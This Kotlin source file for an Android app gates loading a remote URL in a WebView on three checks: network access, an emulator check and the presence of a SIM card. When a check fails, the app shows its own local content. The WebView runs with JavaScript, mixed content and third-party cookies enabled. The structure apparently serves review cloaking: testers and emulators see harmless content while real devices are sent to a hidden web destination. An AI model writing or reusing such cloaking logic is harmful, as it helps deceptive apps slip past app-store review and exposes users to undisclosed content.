package example.redirect.com.work

import android.annotation.SuppressLint
import android.content.Context
import android.telephony.TelephonyManager
import android.util.Log
import android.view.KeyEvent
import android.view.View
import android.webkit.CookieManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import example.redirect.com.LINK
import example.redirect.com.databinding.ActivityMainBinding
import example.redirect.com.work.WorkCheckes.checkIsEmu
import example.redirect.com.work.WorkCheckes.isNetworkAvailable

object WorkUtils {

    private fun setWebView(
        context: Context,
        binding: ActivityMainBinding,
        url: String,
    ) {
        with(binding.webView) {
            settings.apply {
                javaScriptEnabled = true
                allowContentAccess = true
                mixedContentMode = 0
                domStorageEnabled = true
                useWideViewPort = true
                databaseEnabled = true
                javaScriptCanOpenWindowsAutomatically = true
                cacheMode = WebSettings.LOAD_DEFAULT
            }
            setLayerType(View.LAYER_TYPE_HARDWARE, null)
            CookieManager.getInstance().setAcceptThirdPartyCookies(this, true)
            setOnKeyListener { v, keyCode, event ->
                if (keyCode == KeyEvent.KEYCODE_BACK && canGoBack()) {
                    this.goBack() // Navigate back to previous web page if there is one
                    this.scrollTo(0, 0) // Scroll webview back to top of previous page
                }
                true
            }
            webViewClient = object : WorkData(
                context,
                binding
            ) {}
            webChromeClient = object : WebChromeClient() {}
            loadUrl(url)
        }
    }

    fun isSimSupport(context: Context) = TelephonyManager.SIM_STATE_ABSENT !=
            (context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager).simState


    @SuppressLint("SetJavaScriptEnabled", "NewApi")
    fun checkFirebaseUrl(
        context: Context,
        binding: ActivityMainBinding
    ): Boolean {
        Log.d("workProject", "isNetworkAvailable ${isNetworkAvailable(context)}")
        Log.d("workProject", "checkIsEmu ${checkIsEmu()}")
        Log.d("workProject", "isSimSupport ${isSimSupport(context)}")
        return if (
            isNetworkAvailable(context)
            && checkIsEmu()
            && isSimSupport(context)
        ) {
            Log.d("workProject", "savedUrl ${LINK}")
            android.os.Handler().postDelayed({
                if(LINK.isNotEmpty()) {
                    setWebView(context, binding, LINK)
                    true
                } else {
                    binding.webView.visibility = View.GONE
                    binding.content.visibility = View.VISIBLE
                    binding.splash.visibility = View.GONE
                    false
                }
            }, 3600)
        } else false
    }

}
